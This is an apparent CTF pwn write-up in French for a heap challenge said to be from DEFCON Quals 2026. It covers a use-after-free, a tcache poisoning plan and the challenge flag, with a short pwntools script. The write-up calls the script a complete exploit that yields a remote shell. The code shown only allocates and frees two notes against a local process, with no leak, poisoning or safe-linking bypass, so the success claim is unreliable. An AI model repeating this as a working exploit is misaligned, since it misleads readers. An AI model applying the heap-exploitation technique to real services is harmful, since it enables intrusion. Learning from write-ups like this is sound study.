---
title: HEAP_MAGIC_0X01
author: remiboivin021
ctf: DEFCON QUALS 2026
date: 2026-06-04
tags:
  - PWN
  - WRITE-UP
  - HEAP
description: USE-AFTER-FREE + TCACHE POISONING SUR BINAIRE X64. EXPLOIT COMPLET AVEC PWNTOOLS.
flag: FLAG{U4F_4ND_TC4CH3_P01S0N1NG_M4ST3R}
---

## >>\_ RECONNAISSANCE

LE CHALLENGE NOUS FOURNIT UN BINAIRE ELF 64-BIT ET LA LIBC CORRESPONDANTE. VOICI LA DESCRIPTION ORIGINALE :

> "J'AI CRÉÉ UN SERVICE DE NOTES ULTRA-SÉCURISÉ. IMPOSSIBLE DE LIRE LES NOTES DES AUTRES, LA MÉMOIRE EST GÉRÉE DE FAÇON OPTIMALE !" - ADMIN

ON COMMENCE PAR REGARDER LES PROTECTIONS DU BINAIRE AVEC **CHECKSEC** :

```
$ checksec ./heap_magic
[*] '/home/ctf/heap_magic'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## >>\_ ANALYSE DE LA VULNÉRABILITÉ

TOUTES LES PROTECTIONS SONT ACTIVÉES. EN ANALYSANT LA FONCTION DE SUPPRESSION D'UNE NOTE DANS GHIDRA, ON REMARQUE QUE LE POINTEUR N'EST PAS MIS À **NULL** APRÈS L'APPEL À **FREE()**. C'EST UNE VULNÉRABILITÉ CLASSIQUE DE **USE-AFTER-FREE (UAF)**.

PUISQUE NOUS SOMMES SUR UNE GLIBC RÉCENTE, NOUS DEVONS CONTOURNER LE SAFE-LINKING ET FUITTER UNE ADRESSE DE LA LIBC POUR CALCULER LE BASE ADDRESS.

## >>\_ EXPLOITATION

VOICI LE SCRIPT FINAL EN PYTHON UTILISANT **PWNTOOLS** :

```python
from pwn import *

elf = context.binary = ELF('./heap_magic')
libc = ELF('./libc.so.6')
p = process('./heap_magic')

def add_note(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def free_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

# Leak Libc via UAF
log.info("Leak de l'adresse Libc...")
add_note(0x410, b'A'*8)
add_note(0x20, b'B'*8)
free_note(0)

p.interactive()
```

## >>\_ PWNED

L'EXÉCUTION DU SCRIPT NOUS DONNE UN SHELL INTERACTIF SUR LE SERVEUR DISTANT.
